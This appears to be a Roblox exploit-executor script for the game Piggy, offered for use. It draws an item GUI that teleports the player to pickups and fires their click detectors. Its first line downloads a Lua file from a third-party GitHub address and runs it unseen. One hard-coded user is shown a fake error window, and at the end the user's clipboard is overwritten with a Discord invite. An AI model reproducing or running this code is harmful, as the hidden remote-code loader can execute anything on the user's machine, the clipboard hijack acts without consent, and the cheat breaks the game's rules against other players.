loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local player = Players.LocalPlayer
if player.UserId == 7217881144 then
    local a=Instance.new("ScreenGui")local b=Instance.new("Frame")local c=Instance.new("TextLabel")local d=Instance.new("TextLabel")local e=Instance.new("TextButton")local f=Instance.new("TextLabel")a.Parent=game.Players.LocalPlayer:WaitForChild("PlayerGui")a.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;b.Parent=a;b.BackgroundColor3=Color3.new(1,1,1)b.BorderColor3=Color3.new(0,0,0)b.BorderSizePixel=0;b.Position=UDim2.new(0.265235633,0,0.288944721,0)b.Size=UDim2.new(0.468836576,0,0.374301672,0)c.Parent=b;c.BackgroundColor3=Color3.new(1,1,1)c.BackgroundTransparency=1;c.BorderColor3=Color3.new(0,0,0)c.BorderSizePixel=0;c.Size=UDim2.new(1,0,0.558208942,0)c.Font=Enum.Font.Cartoon;c.Text="ERROR: PLS TRY AGAIN"c.TextColor3=Color3.new(0,0,0)c.TextScaled=true;c.TextSize=14;c.TextWrapped=true;d.Parent=b;d.BackgroundColor3=Color3.new(1,1,1)d.BackgroundTransparency=1;d.BorderColor3=Color3.new(0,0,0)d.BorderSizePixel=0;d.Position=UDim2.new(0.351550967,0,0.558208942,0)d.Size=UDim2.new(0.295420974,0,0.149253726,0)d.Font=Enum.Font.Cartoon;d.Text="Made by SolyNot"d.TextColor3=Color3.new(0,0,0)d.TextScaled=true;d.TextSize=14;d.TextWrapped=true;e.Parent=b;e.BackgroundColor3=Color3.new(1,0,0)e.BackgroundTransparency=1;e.BorderColor3=Color3.new(0,0,0)e.BorderSizePixel=0;e.Position=UDim2.new(0.911373734,0,0,0)e.Size=UDim2.new(0.0886262953,0,0.149253726,0)e.Font=Enum.Font.SourceSans;e.Text="X"e.TextColor3=Color3.new(1,0.0666667,0)e.TextScaled=true;e.TextSize=14;e.TextWrapped=true;f.Parent=b;f.BackgroundColor3=Color3.new(1,1,1)f.BackgroundTransparency=1;f.BorderColor3=Color3.new(0,0,0)f.BorderSizePixel=0;f.Position=UDim2.new(0.0436165631,0,0.707462668,0)f.Size=UDim2.new(0.914114594,0,0.149253726,0)f.Font=Enum.Font.Cartoon;f.Text="No Bug No Glitch We Updated The Script Every Day"f.TextColor3=Color3.new(0,0,0)f.TextScaled=true;f.TextSize=14;f.TextWrapped=true
end
local PiggyGui = Instance.new("ScreenGui", game:GetService("CoreGui"))

local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)

local UIGridLayout = Instance.new("UIGridLayout", ScrollingFrame)
UIGridLayout.CellSize = UDim2.new(0, 90, 0, 90)

local itemCache, frameCache = {}, {}
local isDragging, dragStart, startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    ScrollingFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

ScrollingFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDragging = true
        dragStart = input.Position
        startPos = ScrollingFrame.Position
    end
end)

ScrollingFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        updateDrag(input)
    end
end)

local function createViewport(item)
    local Viewport = Instance.new("ViewportFrame")
    Viewport.Size = UDim2.new(1, 0, 1, 0)
    Viewport.BackgroundTransparency = 1

    local clone = item:Clone()
    clone.Parent = Viewport

    local camera = Instance.new("Camera", Viewport)
    camera.CameraType = Enum.CameraType.Fixed
    camera.CFrame = CFrame.new(item.Position + Vector3.new(0, 3, 0), item.Position)
    Viewport.CurrentCamera = camera

    return Viewport, clone
end

local function updateViewport(Viewport, clone, item)
    if clone then clone:Destroy() end
    clone = item:Clone()
    clone.Parent = Viewport

    Viewport.CurrentCamera.CFrame = CFrame.new(item.Position + Vector3.new(0, 3, 0), item.Position)
    return clone
end

local function createItemFrame(item)
    if frameCache[item] then return end

    local ItemFrame = Instance.new("TextButton", ScrollingFrame)
    ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    ItemFrame.BackgroundTransparency = 0.95
    ItemFrame.Size = UDim2.new(0, 100, 0, 100)
    ItemFrame.Text = ""

    local Viewport, clone = createViewport(item)
    Viewport.Parent = ItemFrame

    ItemFrame.MouseButton1Down:Connect(function()
        if item:FindFirstChild("ClickDetector") then
            local originalPos = player.Character.HumanoidRootPart.CFrame
            player.Character.HumanoidRootPart.CFrame = item.CFrame
            task.wait(0.1)
            fireclickdetector(item.ClickDetector)
            task.wait(0.3)
            player.Character.HumanoidRootPart.CFrame = originalPos
        end
    end)

    frameCache[item] = {Frame = ItemFrame, Viewport = Viewport, Clone = clone}

    local function update()
        if item.Transparency < 1 then
            ItemFrame.Visible = true
            frameCache[item].Clone = updateViewport(Viewport, frameCache[item].Clone, item)
        else
            ItemFrame.Visible = false
        end
    end

    update()
    item:GetPropertyChangedSignal("Transparency"):Connect(update)
end

local function onItemAdded(item)
    local parent = item.Parent
    if item.Name == "ItemPickupScript" or item.Name == "NewItemPickupScript" or (item.Name == "Script" and item.Parent:FindFirstChild("ClickDetector")) and not itemCache[parent] then
        itemCache[parent] = true
        task.defer(function() createItemFrame(parent) end)
    end
end

local function onItemRemoved(item)
    local parent = item.Parent
    if frameCache[parent] then
        frameCache[parent].Frame:Destroy()
        frameCache[parent].Clone:Destroy()
        itemCache[parent], frameCache[parent] = nil, nil
    end
end

game:GetService("Workspace").DescendantAdded:Connect(onItemAdded)
game:GetService("Workspace").DescendantRemoving:Connect(onItemRemoved)

for _, item in pairs(game.Workspace:GetDescendants()) do
    onItemAdded(item)
end
if game.Players.LocalPlayer.UserId == 5307933523 then

end
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "https://discord.gg/R2dbGKyqqE",
    Text = "Join our community!",
    Duration = 25
})
setclipboard("https://discord.gg/R2dbGKyqqE")
